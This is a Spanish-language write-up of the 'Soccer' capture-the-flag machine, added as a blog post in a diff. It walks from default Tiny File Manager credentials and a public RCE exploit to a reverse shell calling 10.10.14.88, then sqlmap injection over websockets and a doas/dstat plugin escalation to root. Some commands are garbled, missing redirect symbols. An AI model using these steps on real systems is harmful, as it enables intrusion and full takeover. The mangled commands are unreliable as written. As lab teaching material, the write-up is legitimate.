@@ -1,0 +1,96 @@
+---
+title: 'CTF - Soccer WriteUp'
+date: '2022-12-27'
+tags: ["CTF", "Rce", "Suid", "Dstat", "Doas", "Websockets"]
+draft: true
+authors: ['default']
+summary: '![](/static/images/uploads/ctf-soccer-write-up/Soccer.webp)'
+---
+
+![](/static/images/uploads/ctf-soccer-write-up/Soccer.webp)
+
+Hacer nmap
+
+Hacer wfuzz y encontrar /tiny
+
+![](/static/images/uploads/ctf-soccer-write-up/image.webp)
+
+Ir al repositorio https://github.com/prasathmani/tinyfilemanager y encontrar el siguiente trozo de markdown.
+
+Default username/password: **admin/admin@123** and **user/12345**.
+
+
+Probarlo y estar dentro.
+
+Puedes subir archivos y ejecutar codigo remoto 
+
+[Tiny File Manager 2.4.6 - Remote Code Execution (RCE)Tiny File Manager 2.4.6 - Remote Code Execution (RCE). CVE-2021-45010CVE-2021-40964 . webapps exploit for PHP platform![](/static/images/uploads/ctf-soccer-write-up/favicon.ico)
+
+Exploit DatabaseFEBIN MON SAJI![](/static/images/uploads/ctf-soccer-write-up/spider-orange.webp)](https://www.exploit-db.com/exploits/50828)Puedo entrar a una shell con el siguiente comando 
+
+
+```
+bash -c "sh -i & /dev/tcp/10.10.14.88/1111 0&1"
+```
+Mirando en /etc/***nginx***/***sites***-***available***/ vemos un subdominio: http://soc-player.soccer.htb. Es una web donde te puedes registrar y verificar tickets de futbol. 
+
+![](/static/images/uploads/ctf-soccer-write-up/image-1.webp)
+
+La comunicación que hay por debajo es websocket. 
+
+Existe un script https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html que levanta un servidor http, que utilizaremos de proxy con sqlmap para poder realizar sqli directamente.
+
+![](/static/images/uploads/ctf-soccer-write-up/image-2.webp)
+
+Entro por ssh, y busco archivos suid 
+
+
+```
+find \-perm -4000 2/dev/null
+```
+Encuentro doas
+
+
+```
+player@soccer:/usr/local/bin$ ls -l
+-rwsr-xr-x 1 root root 42224 Nov 17 09:09 doas
+-rwxr-xr-x 1 root root  2002 Nov 17 09:09 doasedit
+-rwxr-xr-x 1 root root  5471 Nov 17 09:09 vidoas
+```
+El bit SUID activo.
+
+Doas es un comando similar a sudo, capaz de ejecutar comandos desde otro usuario dependiendo su configuración. Su archivo de configuración por defecto está en /etc/doas.conf pero este no es el caso. Mirando el archivo vidoas, observamos los siguiente
+
+
+```
+player@soccer:/usr/local/bin$ cat vidoas | grep conf
+# Edit a temporary copy of the doas.conf file and check it for syntax
+# errors before installing it as the actual doas.conf file.
+DOAS_CONF=/usr/local/etc/doas.conf
+...
+```
+Haciendo un cat en esa ruta, vemos 
+
+
+```
+player@soccer:/usr/local/bin$ cat /usr/local/etc/doas.conf
+permit nopass player as root cmd /usr/bin/dstat
+```
+dstat es un comando para ver procesos del sistema. Leyendo MAN, vemos que tiene una carpeta de plugins /usr/local/share/dstat/
+
+Creamos un plugin dentro del directorio. El plugin tiene que seguir la siguiente convención de nombres: dstat\_.py. Por lo que ejecutamos el siguiente comando:
+
+
+```
+echo 'import os; os.system("bash -i")'  dstat_privesc.py
+```
+Ahora, debemos ejecutar dstat con ayuda de doas, siendo root y pasando el argumento necesario a dstat para que ejecute nuestro plugin. Como se denomina dstat\_privesc, tenemos que ejecutar el siguiente comando
+
+
+```
+doas -u root /usr/bin/dstat --privesc
+root@soccer:/usr/local/share/dstat# whoami
+
+# Output
+root
+```
